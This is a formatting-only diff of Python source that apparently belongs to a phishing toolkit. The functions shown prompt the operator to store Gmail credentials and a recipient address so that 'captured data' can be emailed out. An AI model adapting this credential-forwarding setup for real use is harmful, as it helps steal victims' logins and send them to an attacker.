@@ -12,7 +12,8 @@ import Defs.ThemeManager.theme as theme
 default_palette = theme.default_palette
 
 
-def captured_data_email_confirmation(port):  # Ask user to start sending credentials to recipient Email Address.
+# Ask user to start sending credentials to recipient Email Address.
+def captured_data_email_confirmation(port):
     import Defs.ActionManager.simple_informant as simple_informant
     choice = input(
         "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(
@@ -50,14 +51,16 @@ def captured_data_email_configuration_prompt():
     # run_command('cp Defs/FeatureManager/EmailManager/EmailConfigDefault.py Defs/FeatureManager/EmailManager/emailconfig.py')
     copyfile('Defs/FeatureManager/EmailManager/EmailConfigDefault.py',
              'Defs/FeatureManager/EmailManager/emailconfig.py')
-    GMAILACCOUNT = input("{0}[{1}+{0}] Enter Your Gmail Username:{1} ".format(default_palette[0], default_palette[4]))
+    GMAILACCOUNT = input(
+        "{0}[{1}+{0}] Enter Your Gmail Username:{1} ".format(default_palette[0], default_palette[4]))
     with open('Defs/FeatureManager/EmailManager/emailconfig.py') as f:
         read_data = f.read()
         c = read_data.replace('GMAILACCOUNT', GMAILACCOUNT)
         f = open('Defs/FeatureManager/EmailManager/emailconfig.py', 'w')
         f.write(c)
         f.close()
-        print("{0}[.] {1}Email Address Added To config File. !\n".format(default_palette[0], default_palette[4]))
+        print("{0}[.] {1}Email Address Added To config File. !\n".format(
+            default_palette[0], default_palette[4]))
     GMAILPASSWORD = getpass.getpass(
         "{0}[{1}+{0}] Enter Your Gmail Password:{1} ".format(default_palette[0], default_palette[4]))
     with open('Defs/FeatureManager/EmailManager/emailconfig.py') as f:
@@ -68,7 +71,8 @@ def captured_data_email_configuration_prompt():
         f = open('Defs/FeatureManager/EmailManager/emailconfig.py', 'w')
         f.write(c)
         f.close()
-        print("{0}[.] {1}Password(Encoded) Added To config File. !\n".format(default_palette[0], default_palette[4]))
+        print("{0}[.] {1}Password(Encoded) Added To config File. !\n".format(
+            default_palette[0], default_palette[4]))
     RECIPIENTEMAIL = input(
         "{0}[{1}+{0}] Enter Recipient Email:{1} ".format(default_palette[0], default_palette[4]))
     with open('Defs/FeatureManager/EmailManager/emailconfig.py') as f:
